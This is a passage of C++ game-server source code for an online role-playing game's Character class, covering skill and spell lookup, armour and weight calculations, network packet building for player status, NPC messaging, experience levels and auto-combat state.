   if( dwSkill >= SPELL_ID_OFFSET )
   {
      tlusSpells.ToHead();
      while( tlusSpells.QueryNext() && lpUserSkill == NULL )
      {
         if( tlusSpells.Object()->GetSkillID() == (int)dwSkill )
         {
            lpUserSkill = tlusSpells.Object();
            lpUserSkill->SetSkillPnts( 1 );
         }
      }
   }
   else
   {
      int i;		
      for(i = 0; i < NB_SKILL_HOOKS; i++)
      {
         tlusSkills[i].Lock();
         tlusSkills[i].ToHead();
         while(tlusSkills[i].QueryNext() && lpUserSkill == NULL )
         {
            // If it found the skill, it returns it.
            if(tlusSkills[i].Object()->GetSkillID() == (int)dwSkill)
            {
               lpUserSkill = tlusSkills[i].Object();
            }
         }
         tlusSkills[i].Unlock();
      }
   }
   // nothing found.
   return lpUserSkill;
}
/******************************************************************************/
// Returns the skills inside a template list. 
TemplateList <USER_SKILL> * Character::GetSkillsList( void )
/******************************************************************************/
{
   return tlusSkills;
}
/******************************************************************************/
// This functions puts the loaded player in game.
char Character::PutPlayerInGame( void )
/******************************************************************************/
{
   if( boLoaded )
   {		
      TRACE("\r\nHerE1");

      WorldMap *wl;
      BOOL IsGod = FALSE;

      Unit *binded_unit;
      wl = TFCMAIN::GetWorld((WORD)GetWL().world);
      if( wl != NULL )
      {
         binded_unit = wl->create_world_unit(U_PC, GetAppearance(), GetWL(), this);

         // if unit wasn't create well euh..
         int i;
         WorldPos OldPos = GetWL();				
         WorldPos CurPos;
         if(!binded_unit){
            TRACE("\r\nHerE2");

            i = 1;
            while( i < 9 && binded_unit != NULL )
            {
               CurPos = OldPos;
               switch(i)
               {
               case 1:
                  CurPos.Y--;
                  SetWL(CurPos);
                  break;
               case 2:
                  CurPos.Y++;
                  SetWL(CurPos);
                  break;
               case 3: 
                  CurPos.X--;
                  SetWL(CurPos);
                  break;
               case 4: 
                  CurPos.X--;
                  SetWL(CurPos);
                  break;
               case 5:
                  CurPos.X--;
                  CurPos.Y--;
                  SetWL(CurPos);
                  break;
               case 6: 
                  CurPos.X++;
                  CurPos.Y--;
                  SetWL(CurPos);
                  break;
               case 7: 
                  CurPos.X--;	
                  CurPos.Y++;
                  SetWL(CurPos);
                  break;
               case 8: 
                  CurPos.X++;	
                  CurPos.Y++;
                  SetWL(CurPos);
                  break;
               }						
               binded_unit = wl->create_world_unit(U_PC, GetAppearance(), GetWL(), this, IsGod);
               i++;
            }
         }		
      }

      if( binded_unit )
      {
         return 0;		
      }

   }

   return 1;
}
/******************************************************************************/
// Returns the quantity of skill points available for wasting in skills.
WORD Character::GetSkillPoints( void )
/******************************************************************************/
{
   return wNbSkillPnts;
}
/******************************************************************************/
// Gives skill points to a user.
void Character::GiveSkillPoints(WORD wQuantity) // The quantity of skill points to add.

/******************************************************************************/
{
   wNbSkillPnts += wQuantity;
}
/******************************************************************************/
// Returns the quantity of stat points available for wasting in stats.
WORD Character::GetStatPoints( void )
/******************************************************************************/
{
   return wNbStatPnts;
}
/******************************************************************************/
// Returns the player's AC
double Character::GetAC( void )
/******************************************************************************/
{
   // Get the boosted AC.
   double dblAC = QueryBoost( STAT_AC );

   // Get the true AC
   dblAC += GetTrueAC();

   TRACE( "\r\n--Total AC %f.", dblAC );

   if( dblAC <= 0 )
   {
      return 0;
   }
   else
   {
      return dblAC;
   }
}       
/******************************************************************************/
//  Returns the unboosted AC of a character.
double Character::GetTrueAC( void )
/******************************************************************************/
{
   double dblAC = 0;

   if( equipped[ body ] )			dblAC += equipped[ body ]->GetAC();
   if( equipped[ feet ] )			dblAC += equipped[ feet ]->GetAC();
   if( equipped[ gloves ] )		    dblAC += equipped[ gloves ]->GetAC();
   if( equipped[ helm ] )			dblAC += equipped[ helm ]->GetAC();
   if( equipped[ legs ] )			dblAC += equipped[ legs ]->GetAC();
   if( equipped[ cape ] )		    dblAC += equipped[ cape ]->GetAC();
   if( equipped[ belt ] )			dblAC += equipped[ belt ]->GetAC();
   if( equipped[ ring1 ] )			dblAC += equipped[ ring1 ]->GetAC();
   if( equipped[ ring2 ] )			dblAC += equipped[ ring2 ]->GetAC();
   if( equipped[ Orbe1 ] )			dblAC += equipped[ Orbe1 ]->GetAC();
   if( equipped[ bracelets ] )		dblAC += equipped[ bracelets ]->GetAC();
   if( equipped[ necklace ] )		dblAC += equipped[ necklace ]->GetAC();
   if( equipped[ weapon_right ] )	dblAC += equipped[ weapon_right ]->GetAC();
   if( equipped[ weapon_right ] != equipped[ weapon_left ] && equipped[ weapon_left ] != NULL ) 
   {
      dblAC += equipped[ weapon_left ]->GetAC();
   }
    
   

   TRACE( "\r\n--Total AC %f.", dblAC );

   if( dblAC <= 0 )
   {
      return 0;
   }
   else
   {
      return dblAC;
   }
}
/******************************************************************************/
// Returns the current agressivness of the player.
char Character::GetAgressivness( void )
/******************************************************************************/
{
   return cAgressive;
}
/******************************************************************************/
// Sets the agressivness of the unit
void Character::SetAgressivness(char cAgr) // the new agressivness
/******************************************************************************/
{
   cAgressive = cAgr;
}
/******************************************************************************/
// Returns the equipment array of the player.
Unit **Character::GetEquipment( void )
/******************************************************************************/
{
   return equipped;
}
/******************************************************************************/
// Returns the list of user spells.
TemplateList<USER_SKILL> *Character::GetSpells( void )
/******************************************************************************/
{
   return &tlusSpells;
}



TemplateList<USER_PROFESSION_F> *Character::GetProfession( void )////RENDU ICI
//////////////////////////////////////////////////////////////////////////////////////////
// Returns the list of user spells.
// 
// Return: TemplateList<USER_SKILL>, The list of user spells
//////////////////////////////////////////////////////////////////////////////////////////
{
   return &tlProfessionAcq;
}



/******************************************************************************/
// Determines if the character can attack.
BOOL Character::CanAttack( void )
/******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   /// *****E_NMS_DEATH 
   return TRUE;
}
/******************************************************************************/
// Locked when player has been created but not yet saved.
void Character::WaitForSaving( void )
/******************************************************************************/
{
   WaitForSingleObject( hCreationEvent, INFINITE );	
}
/******************************************************************************/
// Called when starting to commit data.
void Character::SavingStart( void )
/******************************************************************************/
{
   _LOG_DEBUG
      LOG_DEBUG_HIGH,
      "SavingStart %s.",
      (LPCTSTR)GetTrueName()
      LOG_

      ResetEvent( hCreationEvent );
}
/******************************************************************************/
// Called to signal end of creation.
void Character::SavingStop( void )
/******************************************************************************/
{
   _LOG_DEBUG
      LOG_DEBUG_LVL1,
      "Finished async saving character %s.  (%d ms)",
      (LPCTSTR)GetTrueName(),
      (timeGetTime() - m_dwSaveCallBackTimeStart)
      LOG_

      SetEvent( hCreationEvent );
}
/******************************************************************************/
// PAckets the skills
void Character::PacketSkills(TFCPacket &sending,bool gameop)
/******************************************************************************/
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->PacketSkills(sending,true );
      return;
   }


   // This request should return all the player's skills
   TemplateList <USER_SKILL> *tlusSkills = GetSkillsList( );

   int i;
   BOOL boSent;
   LPUSER_SKILL lpUserSkill;
   LPSKILL lpSkill;

   TemplateList <USER_SKILL> tlSentSkills;

   for( i = 0; i < NB_SKILL_HOOKS; i++ )
   {
      tlusSkills[i].ToHead();
      while(tlusSkills[i].QueryNext() )
      {
         lpUserSkill = tlusSkills[i].Object();

         // Only send existing skills
         TRACE( "--%u--", lpUserSkill->GetSkillID() );

         if( Skills::GetSkill( lpUserSkill->GetSkillID() ) != NULL )
         {
            // first verify that this skills hasn't been already sent in an earlier hook
            boSent = FALSE;
            tlSentSkills.ToHead();
            while( tlSentSkills.QueryNext() )
            {
               if( tlSentSkills.Object() == lpUserSkill )
               {
                  boSent = TRUE;
               }
            }

            // If skill wasn't found, add it to the list to send.
            if( !boSent )
            {
               if(lpUserSkill->GetSkillID() == __SKILL_CRITICAL_STRIKE && theApp.dwEquilibrageNewSkillEnable == 1)
                  tlSentSkills.AddToTail( lpUserSkill );
               else if(lpUserSkill->GetSkillID() != __SKILL_CRITICAL_STRIKE)
                  tlSentSkills.AddToTail( lpUserSkill );
            }
         }
      }
   }

   sending << (RQ_SIZE)RQ_GetSkillList;
   sending << (short)( tlSentSkills.NbObjects() + 2 );

   CString csText;

   // Attack
   sending << (short)__SKILL_ATTACK;
   sending << (char)0;
   sending << (short)GetATTACK();
   sending << (short)GetTrueATTACK();
   sending << CString( _STR( 449, GetLang() ) ) ;
   sending << CString( _STR( 7889, GetLang() ) ) ;

   
   SendSkill(tlSentSkills,__SKILL_ARCHERY,sending);
   if(theApp.dwEquilibrageNewSkillEnable == 1)
   {
      SendSkill(tlSentSkills,__SKILL_CRITICAL_STRIKE,sending);
   }
   

   // Dodge
   sending << (short)__SKILL_DODGE;
   sending << (char)0;
   sending << (short)GetDODGE();
   sending << (short)GetTrueDODGE();
   sending << CString( _STR( 450, GetLang() ) );
   sending << CString( _STR( 7890, GetLang() ) );

   tlSentSkills.ToHead();
   while( tlSentSkills.QueryNext() )
   {
      lpUserSkill = tlSentSkills.Object();
      lpSkill = Skills::GetSkill( lpUserSkill->GetSkillID() );		

      //on envoie tous les skill excepter archery et criticalstrike deja envoyer,....
      if((short)lpUserSkill->GetSkillID() != __SKILL_ARCHERY         &&
         (short)lpUserSkill->GetSkillID() != __SKILL_CRITICAL_STRIKE    )
      {
         sending << (short)lpUserSkill->GetSkillID();
         // Skill usable on a unit.
         if( lpSkill->nHook & HOOK_USE_TARGET_UNIT )
         {
            sending << (char)3;
         }
         else
            // Skill usable on a target position.	
            if( lpSkill->nHook & HOOK_USE_TARGET_POS )
            {
               sending << (char)2;
            }
            else
               // skill usable without further information.
               if( lpSkill->nHook & HOOK_USE )
               {
                  sending << (char)1;
               }
               else
               {
                  // Skill not usable.		
                  sending << (char)0;
               }

               sending << (short)lpUserSkill->GetSkillPnts( this );
               sending << (short)lpUserSkill->GetTrueSkillPnts();
               sending << (CString)lpSkill->GetName( GetLang() );
               sending << (CString)lpSkill->GetDesc( GetLang() );
      }

      
   }
}

void Character::SendSkill(TemplateList <USER_SKILL> &tlSentSkills,short shSkillID,TFCPacket &sending)
{
   LPUSER_SKILL lpUserSkill;
   LPSKILL lpSkill;

   tlSentSkills.ToHead();
   while( tlSentSkills.QueryNext() )
   {
      lpUserSkill = tlSentSkills.Object();

      lpSkill = Skills::GetSkill( lpUserSkill->GetSkillID() );		
      if((short)lpUserSkill->GetSkillID() == shSkillID)
      {
         sending << (short)lpUserSkill->GetSkillID();
         // Skill usable on a unit.
         if( lpSkill->nHook & HOOK_USE_TARGET_UNIT )
         {
            sending << (char)3;
         }
         else
            // Skill usable on a target position.	
            if( lpSkill->nHook & HOOK_USE_TARGET_POS )
            {
               sending << (char)2;
            }
            else
               // skill usable without further information.
               if( lpSkill->nHook & HOOK_USE )
               {
                  sending << (char)1;
               }
               else
               {
                  // Skill not usable.		
                  sending << (char)0;
               }

               sending << (short)lpUserSkill->GetSkillPnts( this );
               sending << (short)lpUserSkill->GetTrueSkillPnts();
               sending << (CString)lpSkill->GetName( GetLang() );
               sending << (CString)lpSkill->GetDesc( GetLang() );

         return;
      }
   }
}
/******************************************************************************/
// Packets the spells
void Character::PacketSpells(TFCPacket &sending,BYTE bUpdate,bool gameop)
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->PacketSpells(sending,bUpdate, true );
      return;
   }

   TemplateList <USER_SKILL> *lptlusSpells;
   LPUSER_SKILL lpUserSkill;
   LPSPELL_STRUCT lpSpell;

   lptlusSpells = GetSpells();	

   sending << (RQ_SIZE)RQ_SendSpellList;
   sending << (char)bUpdate;		
   sending << (short)GetMana();
   sending << (short)GetMaxMana();
   sending << (short)lptlusSpells->NbObjects();

   lptlusSpells->Lock();
   lptlusSpells->ToHead();		
   while( lptlusSpells->QueryNext() )
   {
      lpUserSkill = lptlusSpells->Object();

      lpSpell = SpellMessageHandler::GetSpell( lpUserSkill->GetSkillID() );

      if( lpSpell != NULL )
      {			
         sending << (short)lpUserSkill->GetSkillID();
         //sending << (short)lpUserSkill->nSkillPnts;
         //sending << (char)lpSpell->bSpellType;
         BYTE bTarget = lpSpell->bTarget;
         //switch( bTarget )
         //{
         //case TARGET_UNIT_LIVING_NONSELF:
         //case TARGET_UNIT_ANY_NONSELF:
         //case TARGET_UNIT_PC_NONSELF:
         //case TARGET_UNIT_LIVING_FAVOR_NPC:
         //case TARGET_UNIT_LIVING_FAVOR_NPC_NONSELF:
         //    bTarget = TARGET_UNIT_ANY;
         //}
         sending << (char)bTarget;
         sending << (char)lpSpell->attackSpell;
         sending << (short)lpSpell->bfManaCost.GetBoost( this );
         sending << (long)lpSpell->bfDuration.GetBoost( this );
         sending << (short)lpSpell->saAttrib.skLevel;
         sending << (short)lpSpell->bElementType;            
         sending << (short)lpSpell->bDamageType;
         sending << (long)lpSpell->dwIcon;
         sending << lpSpell->GetDesc( GetLang() );
         sending << (CString)( lpSpell->GetName( GetLang() ) );
      }else{
         sending << (short)0;
      }
   }
   lptlusSpells->Unlock();
}
/******************************************************************************/
// PAckets the user's status
void Character::PacketStatus(TFCPacket &sending,bool gameop)/* The packet */ 
/******************************************************************************/
{
   // This request is sent by the client to query its stats/hp/mana alouette
   // If the gameop set a context.
   if( gameopContext != NULL && !gameop )
   {
      // Use this context.
      gameopContext->PacketStatus(sending,true );
      return;
   }

   sending << (RQ_SIZE)RQ_GetStatus;
   sending << (long)GetHP();
   sending << (long)GetMaxHP();
   sending << (short)GetMana();
   sending << (short)GetMaxMana();
   sending << (long)(GetXP() >> 32);
   sending << (long)GetXP();
   sending << (short)GetAC();
   sending << (short)GetTrueAC();
   sending << (short)GetSTR();
   sending << (short)GetEND();
   sending << (short)GetAGI();
   sending << (short)0; // wil
   sending << (short)GetWIS();
   sending << (short)GetINT();
   sending << (short)GetLCK(); // lck
   sending << (short)GetStatPoints();
   sending << (short)GetTrueSTR();
   sending << (short)GetTrueEND();
   sending << (short)GetTrueAGI();
   sending << (short)0; // wil
   sending << (short)GetTrueWIS();
   sending << (short)GetTrueINT();
   sending << (short)GetTrueLCK(); // lck
   sending << (short)GetLevel();
   sending << (short)GetSkillPoints();
   sending << (short)GetWeight();
   sending << (short)GetMaxWeight();
   sending << (short)GetKarma();
   sending << (short)GetTrueMaxHP();
   sending << (short)GetTrueMaxMana();
   sending << (short)GetCrime();
   sending << (short)GetHonor();
   sending << (long)ViewFlag(__FLAG_POINTS_RP_XP_EVENTS);
   sending << (long)ViewFlag(__FLAG_POINTS_RP_XP_EVENTS_TOTAL);
   
}

/******************************************************************************/
// PAckets the user's status
void Character::PacketStatus2(TFCPacket &sending,bool gameop)/* The packet */ 
/******************************************************************************/
{
   // This request is sent by the client to query its stats/hp/mana alouette
   // If the gameop set a context.
   if( gameopContext != NULL && !gameop )
   {
      // Use this context.
      gameopContext->PacketStatus2(sending,true );
      return;
   }

   sending << (RQ_SIZE)RQ_GetStatus2;
   sending << (short)GetTrueAirPower();
   sending << (short)GetTrueFirePower();
   sending << (short)GetTrueWaterPower();
   sending << (short)GetTrueEarthPower();
   sending << (short)GetTrueDarkPower();
   sending << (short)GetTrueLightPower();
   sending << (short)GetAirPower();
   sending << (short)GetFirePower();
   sending << (short)GetWaterPower();
   sending << (short)GetEarthPower();
   sending << (short)GetDarkPower();
   sending << (short)GetLightPower();

   sending << (short)GetTrueAirResist();
   sending << (short)GetTrueFireResist();
   sending << (short)GetTrueWaterResist();
   sending << (short)GetTrueEarthResist();
   sending << (short)GetTrueDarkResist();
   sending << (short)GetTrueLightResist();
   sending << (short)GetAirResist();
   sending << (short)GetFireResist();
   sending << (short)GetWaterResist();
   sending << (short)GetEarthResist();
   sending << (short)GetDarkResist();
   sending << (short)GetLightResist();
   sending << (short)GetGender();

}
/******************************************************************************/
// Returns the language associated to a character.
WORD Character::GetLang( void ) const
/******************************************************************************/
{
   return wLang;
}
/******************************************************************************/
// Gets the maximum weight a character can hold.
int Character::GetMaxWeight( void )
/******************************************************************************/
{
   Players *pPlayer = (Players *)ThisPlayer;
   if ( pPlayer != NULL && pPlayer->IsGod())
   {
      return 0xFFFF;
   }
   return ( GetSTR() * 500 / ( 100 + GetSTR() ) );
}
/******************************************************************************/
// Returns the current weight of the player.
int Character::GetWeight( void )
/******************************************************************************/
{
   int nWeight = 0;

   Players *pPlayer = (Players *)ThisPlayer;
   if ( pPlayer != NULL && pPlayer->IsGod())
   {
      return nWeight;
   }

   // Get weight of backpack
   backpack->Lock();
   backpack->ToHead();
   while( backpack->QueryNext() )
   {
      Objects *obj = static_cast< Objects * >( backpack->Object() );
      nWeight += obj->GetWeight() * obj->GetQty();
   }
   backpack->Unlock();

   // Get weight of equipped objects.
   int i;
   for( i = 0; i < EQUIP_POSITIONS; i++ )
   {
      if( equipped[ i ] != NULL )
      {
         if( i == weapon_left )
         {
            // If this isn't a two handed weapon.
            if( equipped[ weapon_right ] != equipped[ weapon_left ] )
            {
               nWeight += equipped[ i ]->GetWeight();
            }
         }
         else
         {
            nWeight += equipped[ i ]->GetWeight();
         }
      }
   }

   return nWeight;
}
/******************************************************************************/
// Gets the free weight that the character can use to hold more items
int Character::GetFreeWeight( void )
//////////////////////////////////////////////////////////////////////////////////////////
// IMPORTANT: this will move around the list pointer of backpack, thus invalidating
//				the current object being pointed by the backpack!
//				Trying this will certainly fail:
//				backpack->QueryNext(); GetFreeWeight(); backpack->Remove();
/******************************************************************************/
{
   int currentWeight	= GetWeight();
   int maxWeight		= GetMaxWeight();
   if (currentWeight >= maxWeight) return 0;
   return (maxWeight - currentWeight);
}
/******************************************************************************/
// Sends a private NPC message to this character.
void Character::SendPrivateMessage
(
 CString &csMessage,    // The message to be sent.
 Unit *lpuTarget,       // The unit which talks.
 DWORD dwColor          // Talk color.
 )
 /******************************************************************************/
{
   BYTE bDirection = 0;	
   signed int Xoff, Yoff;

   WorldPos wlUs   = lpuTarget->GetWL();
   WorldPos wlThem = GetWL();

   Xoff = (wlThem.X - wlUs.X + 11) * 3;
   Yoff = (wlThem.Y - wlUs.Y + 16) * 2;

   if( Yoff > 30 )
   {
      if( Xoff > 30 )
      {
         Xoff -= 30;
         Yoff -= 30;
         if( Xoff > 2 * Yoff )
         {
            bDirection = KP_EAST;
         }
         else if( Yoff > Xoff * 2 )
         {
            bDirection = KP_SOUTH;
         }
         else
         {
            bDirection = KP_SOUTHEAST;
         }
      }
      else
      {
         Yoff -= 30;
         Xoff = 30 - Xoff;
         if( Xoff > 2*Yoff )
         {
            bDirection = KP_WEST;
         }
         else if( Yoff > 2 * Xoff )
         {
            bDirection = KP_SOUTH;
         }
         else 
         {
            bDirection = KP_SOUTHWEST;
         }
      }
   }
   else
   {
      if( Xoff > 30 )
      {
         Xoff -= 30;
         Yoff = 30 - Yoff;
         if( Xoff > 2 * Yoff )
         {
            bDirection = KP_EAST;
         }
         else if( Yoff > Xoff * 2 )
         {
            bDirection = KP_NORTH;
         }
         else
         {
            bDirection = KP_NORTHEAST;
         }
      }
      else
      {
         Yoff = 30 - Yoff;
         Xoff = 30 - Xoff;
         if( Xoff > 2*Yoff )
         {
            bDirection = KP_WEST;
         }
         else if( Yoff > 2 * Xoff )
         {
            bDirection = KP_NORTH;
         }
         else 
         {
            bDirection = KP_NORTHWEST;
         }
      }
   }

   DWORD dwNameColor = CL_RED;
   TFCPacket sending;

   sending << (RQ_SIZE)__EVENT_SHOUT;
   sending << (long)lpuTarget->GetID();
   sending << (char)bDirection;
   sending << (long)dwColor;
   if( lpuTarget->GetType() != U_PC )
   {
      sending << (char)1; // an NPC.
      dwNameColor = U_NPC_COLOR;
   }
   else
   {
      sending << (char)0; // not an NPC.
      Players *TargetPlayer = static_cast< Players * >(lpuTarget->GetPlayer());

      dwNameColor = TargetPlayer->self->ViewFlag(__FLAG_UNIT_COLOR);
      if(!dwNameColor)
      {
         if(theApp.m_dwPVPSyetem2Actif == 1) //PVP SYSTEM
         {
            if ( TargetPlayer->IsGod() ) 
            {
               dwNameColor = U_GOD_COLOR
            }
            else
            {
               if(TargetPlayer->self->GetCrime() == 0 && TargetPlayer->self->GetHonor() == 0)
                  dwNameColor = U_OBJECT_COLOR
               else if(TargetPlayer->self->GetCrime() >= TargetPlayer->self->GetHonor())
                  dwNameColor = U_PC_COLOR
               else
                 dwNameColor = U_PCRP_COLOR
            }
         }
         else
         {
            if ( TargetPlayer->IsGod() ) 
               dwNameColor = U_GOD_COLOR
            else if(TargetPlayer->self->ViewFlag(__FLAG_RPHRP_STATUS) == 1)
               dwNameColor = U_PCRP_COLOR
            else
               dwNameColor = U_PC_COLOR
         }
      }
   }
   sending << csMessage;
   sending << lpuTarget->GetName( GetLang() );
   sending << (long)dwNameColor;

   SendPlayerMessage( sending ); 
}
/******************************************************************************/
// Returns the XP needed to raise next level.
__int64 Character::NextLevelXP( void )
/******************************************************************************/
{
   WORD wLevel = GetLevel();

   if( wLevel >= MAX_LEVEL_XP )
   {
      wLevel = MAX_LEVEL_XP - 1;
   }
   else if( wLevel == 0 )
   {
      wLevel = 1;
   }

   return sm_n64XPchart[ wLevel ];
}
/******************************************************************************/
// Returns the XP needed to raise next level.
__int64 Character::PreviousLevelXP( void )
/******************************************************************************/
{
   WORD wLevel = GetLevel() - 1;

   if( wLevel >= MAX_LEVEL_XP )
   {
      wLevel = MAX_LEVEL_XP - 1;
   }
   else if( wLevel == 0 )
   {
      wLevel = 1;
   }

   return sm_n64XPchart[ wLevel ];
}
/******************************************************************************/
// Returns the XP left before raising to next level.
__int64 Character::XPtoLevel( void )
/******************************************************************************/
{
   try 
   {
      WORD wLevel = GetLevel();

      if( wLevel >= MAX_LEVEL_XP )
      {
         wLevel = MAX_LEVEL_XP - 1;
      }
      else if( wLevel == 0 )
      {
         wLevel = 1;
      }

      return sm_n64XPchart[ wLevel ] - GetXP();
   } 
   catch(...) 
   {
      try{
         _LOG_DEBUG
            LOG_CRIT_ERRORS,
            "Crashed Character::XPtoLevel, character %s.",
            GetName( _DEFAULT_LNG )
            LOG_
      }
      catch(...)
      {
      }
      throw;
   }
}
/******************************************************************************/
// Packets the puppet information of a player.
void Character::PacketPuppetInfo
(
 TFCPacket &sending // The packet in which to put the puppet information.
 )
 /******************************************************************************/
{
   //pour mettre un skin unique ou facilement remarquable
   WORD wValue;
   short shHairColor = ViewFlag(__FLAG_NMS_COLOR_HAIR);
   short shTAGPlayer = ViewFlag(__FLAG_NMS_TAG_DISPLAY_OVER_HEAD);

   short shCapeB = 950;
   short shCapeR = 949;

   Players *pl = reinterpret_cast< Players * >( GetPlayer() );
   if( pl->GetGodFlags() & GOD_TRUE_INVISIBILITY )
   {
      shTAGPlayer = 1; //force le tag 1 au player en true invisibility
   }
  
   sending << (RQ_SIZE)RQ_PuppetInformation;
   sending << (long) GetID();
   PACKET_POS( body );
   PACKET_POS( feet );
   PACKET_POS( gloves );
   PACKET_POS( helm );
   PACKET_POS( legs );
   PACKET_POS( weapon_right );
   PACKET_POS( weapon_left );
   
   if(GetArenaID() >0)
   {
      if(GetArenaTeam() == 1)
      {
         sending << (short)shCapeB;
      }
      else if(GetArenaTeam() == 2)
      {
         sending << (short)shCapeR;
      }
      else
      {
         PACKET_POS( cape );
      }
   }
   else
   {
      PACKET_POS( cape );
   }
   //PACKET_POS( cape );
   
   sending << (short)shHairColor;
   sending << (short)shTAGPlayer;
}
/******************************************************************************/
//  Called whenever the character gets disturbed (moves, use item, use skill, cast spell)
void Character::Disturbed( WORD pTriggers )
/******************************************************************************/
{
   // Stop meditating.
   RemoveFlag( __FLAG_MEDITATING );

   if ( !(pTriggers & DISTURB_DONTCANCELROB) ) 
   {
      // if this trigger is not present... Stop robbing!
      if( ViewFlag( __FLAG_ROBBING ) != 0 )
      {
         SetTarget( NULL );
         RemoveFlag( __FLAG_ROBBING );

         TFCPacket sending;
         sending << (RQ_SIZE)RQ_DispellRob;
         SendPlayerMessage( sending );
      }
   }

   // Block from using chest and close interface
   if (pTriggers & DISTURB_CLOSECHEST) 
   {
      if (boCharacterIsChesting == TRUE) StopUsingChest();
      if (boCharacterIsGuildChesting == TRUE)  StopUsingGuildChest();
   }

   if (pTriggers & DISTURB_CLOSETRADE) 
   {
      m_TradeMgr2.CancelDisturbed();
   }

   if (pTriggers & DISTURB_UNHIDE) 
   {
      Unhide();
   }
}
/******************************************************************************/
//  Pre-translates all messages that come from the console.
bool Character::PreTranslateInGameMessage(
   CString csString // The string that was send to the console.
   )
   /******************************************************************************/
{
   bool boReturn = true;

   return boReturn;
}
/******************************************************************************/
// Sets a character's group.    
void Character::SetGroup( Group *lpNewGroup )// The group.
/******************************************************************************/
{
   // A group should never be set twice. A Character cannot have two groups.
   //ASSERT( lpGroup == NULL );
   lpGroup = lpNewGroup;
}    
/******************************************************************************/
// Gets a character's group.
Group *Character::GetGroup( void )
/******************************************************************************/
{
   return lpGroup;
}
/******************************************************************************/
// You can't really 'vaporize' a player.
void Character::VaporizeUnit( bool bLog )
/******************************************************************************/
{
   ATTACK_STRUCTURE Blow;
   memset( &Blow, 0, sizeof( Blow ) );

   // Simply kill the player.
   Death( &Blow, NULL );	
}
/******************************************************************************/
//  Copies the spells from a given unit into this character.
void Character::CopySpells( Unit *lpSource ) // This unit.
/******************************************************************************/
{
   // NPC.
   if( lpSource->GetType() == U_NPC )
   {
      // Get the MOB structure.
      MonsterStructure *lpMob;
      lpSource->SendUnitMessage( MSG_OnGetUnitStructure, lpSource, NULL, NULL, NULL, &lpMob );

      // If there was a mob structure.
      if( lpMob != NULL )
      {        
         // Flush this user's spells.
         tlusSpells.AnnihilateList();

         vector< LPMONSTER_ATTACK >::iterator i;
         for( i = lpMob->vlpRangeAttacks.begin(); i != lpMob->vlpRangeAttacks.end(); i++ )
         {
            // If this is a spell attack.
            if( (*i)->GetType() == SPELL_ATTACK )
            {
               MONSTER_SPELL_ATTACK *lpMonsterSpell = static_cast< LPMONSTER_SPELL_ATTACK >(*i);

               // Create a new UserSpell
               USER_SKILL *lpUserSkill = new USER_SKILL;
               lpUserSkill->SetSkillPnts( 0 );                    
               lpUserSkill->SetSkillID( lpMonsterSpell->wSpellID );

               TRACE( "\nAdding spell %u.", lpUserSkill->GetSkillID() );

               // Add it to the user's list of spells.
               tlusSpells.AddToTail( lpUserSkill );
            }
         }
      }
   }
}
/******************************************************************************/
// Starts auto-combat.
void Character::StartAutoCombat(
                                Attack attack,  // The attack to start.
                                Unit *target
                                )
                                /******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return ;
   }

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return ;
   }
   /// *****E_NMS_DEATH 
   prevAutoCombatAttack = autoCombatAttack;
   prevAutoCombatState = autoCombatState;
   prevTarget = GetTarget();

   autoCombatState = true;
   autoCombatAttack = attack;
   SetTarget( target );
}
/******************************************************************************/
//  Stops auto-combat.
void Character::StopAutoCombat( void )
/******************************************************************************/
{
   autoCombatState = false;
}
/******************************************************************************/
bool Character::QueryAutoCombatState(
                                     Attack *attack // The attack style to fill. NULL if information isn't needed.
                                     )
                                     /******************************************************************************/
{
   if( attack != NULL )
   {
      *attack = autoCombatAttack;
   }
   return autoCombatState;
}
/******************************************************************************/
// This function returns the previously saved auto combat state before the last 
// SetAutoCombat call.
void Character::RestorePreviousAutoCombatState( void )
/******************************************************************************/
{
   bool tmpState = prevAutoCombatState;
   Attack tmpAttack = prevAutoCombatAttack;
   Unit *tmpTarget = prevTarget;

   prevAutoCombatState = false;
   prevAutoCombatAttack = autoCombatAttack;
   prevTarget = GetTarget();

   autoCombatState = tmpState;
   autoCombatAttack = tmpAttack;
   SetTarget( tmpTarget );
}
/******************************************************************************/
// Executes auto-combat if attack or spell exhaustion has ended.
bool Character::ExecAutoCombat( void )
/******************************************************************************/
{    
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return false;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return false;
   }


   Unit *target = GetTarget();
   // If target doesn't exist
   if( target == NULL )
   {
      StopAutoCombat();
      return false;
   }

   if( target->ViewFlag( __FLAG_INVISIBILITY ) != 0 && ViewFlag( __FLAG_DETECT_INVISIBILITY ) == 0 && this != target )
   {
      //SetTarget( NULL );
      StopAutoCombat();
      return true;
   }

   if( target->ViewFlag( __FLAG_INVISIBILITY2 ) != 0 && ViewFlag( __FLAG_DETECT_INVISIBILITY ) == 0 && this != target )
   {
      //SetTarget( NULL );
      StopAutoCombat();
      return true;
   }

   if( target->ViewFlag( __FLAG_HIDDEN ) != 0 && ViewFlag( __FLAG_DETECT_HIDDEN ) == 0 && this != target )
   {
      //SetTarget( NULL );
      StopAutoCombat();
      return true;
   }

   // Calculate the range between the two players.
   int nXdiff = abs( GetWL().X - target->GetWL().X );
   int nYdiff = abs( GetWL().Y - target->GetWL().Y );
   int nRange = ::sqrt( double(nXdiff * nXdiff + nYdiff * nYdiff ));

   // If player is currently robbing.
   if( ViewFlag( __FLAG_ROBBING ) != 0 )
   {
      const int PeekRange = 2;

      // If the player is still within range.
      if( nRange <= PeekRange )
      {
         return true;
      }

      // Otherwise, cancel robbing.
      SetTarget( NULL );
      RemoveFlag( __FLAG_ROBBING );

      TFCPacket sending;
      sending << (RQ_SIZE)RQ_DispellRob;
      SendPlayerMessage( sending );

      return true;
   }

   // If auto combat is off or player doesn't have a target.
   if( !QueryAutoCombatState() )
